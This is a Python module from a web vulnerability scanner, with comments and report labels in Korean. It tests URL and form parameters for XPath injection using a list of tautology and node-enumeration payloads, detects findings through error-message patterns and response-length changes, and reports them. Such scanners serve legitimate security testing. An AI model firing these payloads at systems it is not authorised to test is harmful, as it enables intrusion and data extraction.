# modules/xpath_injection.py
# -*- coding: utf-8 -*-

import re
import time
from typing import Dict, List, Any
import requests


class SessionXPathInjectionScanner:
    """세션 기반 XPath Injection 스캐너"""

    def __init__(self, session, timeout: int = 10):
        self.session = session
        self.timeout = timeout
        self.vulnerabilities = []

        # XPath Injection payloads
        self.payloads = [
            "' or '1'='1",
            "' or 1=1 or '1'='1",
            "\" or \"1\"=\"1",
            "' or ''='",
            "' and '1'='1",
            "' and '1'='2",
            "' or count(parent::*)>0 or '1'='2",
            "' or count(/*)>0 or '1'='2",
            "' or string-length(name(/*[1]))>0 or '1'='2",
            "' or substring(name(/*[1]),1,1)='a' or '1'='2",
            "']/parent::* | //*[name()='",
            "' and count(//*)>0 and '1'='1",
            "'+and+count(//*)=1+and+'1'='1",
        ]

        # 에러 기반 탐지 패턴
        self.error_patterns = [
            r"XPath", r"xpath", r"XML", r"SimpleXML", r"DOMXPath",
            r"XPathException", r"xmlXPathEval", r"Invalid predicate",
            r"Invalid expression", r"expected node test or name",
        ]

    def scan(self, url: str, params: Dict[str, str] = None,
             method: str = 'GET', data: Dict[str, str] = None) -> List[Dict[str, Any]]:
        """XPath Injection 취약점 스캔"""
        self.vulnerabilities = []

        if method.upper() == 'GET' and params:
            self._test_parameters(url, params, 'GET')
        elif method.upper() == 'POST' and data:
            self._test_parameters(url, data, 'POST')

        return self.vulnerabilities

    def _test_parameters(self, url: str, params: Dict[str, str], method: str):
        """파라미터별로 XPath Injection 테스트"""
        try:
            if method == 'GET':
                baseline = self.session.get(url, params=params, timeout=self.timeout)
            else:
                baseline = self.session.post(url, data=params, timeout=self.timeout)
            baseline_len = len(baseline.text)
        except Exception:
            baseline_len = 0

        for pname in params.keys():
            for payload in self.payloads:
                test_params = params.copy()
                test_params[pname] = payload

                try:
                    if method == 'GET':
                        resp = self.session.get(url, params=test_params, timeout=self.timeout)
                    else:
                        resp = self.session.post(url, data=test_params, timeout=self.timeout)
                except Exception:
                    continue

                # (1) Error-based
                if self._has_xpath_error(resp.text):
                    self.vulnerabilities.append({
                        'type': 'XPath Injection (Error-based)',
                        'url': url,
                        'method': method,
                        'parameter': pname,
                        'payload': payload,
                        'evidence': self._extract_error(resp.text),
                        'severity': 'High'
                    })
                    break

                # (2) Boolean-based
                if self._is_boolean_based(resp, baseline_len, payload):
                    self.vulnerabilities.append({
                        'type': 'XPath Injection (Boolean-based)',
                        'url': url,
                        'method': method,
                        'parameter': pname,
                        'payload': payload,
                        'evidence': 'Response behavior indicates XPath injection',
                        'severity': 'High'
                    })
                    break

                time.sleep(0.3)

    def _has_xpath_error(self, text: str) -> bool:
        """응답 내 XPath 에러 패턴 확인"""
        for p in self.error_patterns:
            if re.search(p, text, re.IGNORECASE):
                return True
        return False

    def _is_boolean_based(self, response, baseline_len: int, payload: str) -> bool:
        """Boolean 기반 XPath Injection 확인"""
        resp_len = len(response.text)
        if "or '1'='1" in payload or "or 1=1" in payload:
            if abs(resp_len - baseline_len) > 100:
                return True
        return False

    def _extract_error(self, text: str, max_len: int = 200) -> str:
        """XPath 에러 문구 일부 추출"""
        for pat in self.error_patterns:
            m = re.search(f".{{0,50}}{pat}.{{0,150}}", text, re.IGNORECASE | re.DOTALL)
            if m:
                return m.group(0)[:max_len]
        return "XPath error detected in response"


def test_xpath_injection(target: str, session, params: Dict[str, str] = None,
                         data: Dict[str, str] = None) -> Dict[str, Any]:
    """
    main.py 에서 호출할 함수
    반환 형식: {'status', 'description', 'details'}
    """
    scanner = SessionXPathInjectionScanner(session=session)
    try:
        if not params and not data:
            params = {'q': 'test'}  # 기본 테스트 파라미터

        vulns = []
        if params:
            vulns.extend(scanner.scan(target, params=params, method='GET'))
        if data:
            vulns.extend(scanner.scan(target, data=data, method='POST'))

        if vulns:
            details = [f"{v['method']} param={v['parameter']} payload={v['payload'][:50]} evidence={v['evidence'][:100]}"
                       for v in vulns]
            return {
                'status': '취약',
                'description': f'XPath Injection 의심 {len(vulns)}건 발견',
                'details': details
            }
        else:
            return {
                'status': '양호',
                'description': 'XPath Injection 징후 미검출',
                'details': []
            }

    except Exception as e:
        return {
            'status': '인터뷰',
            'description': f'검사 중 예외 발생: {str(e)}',
            'details': []
        }
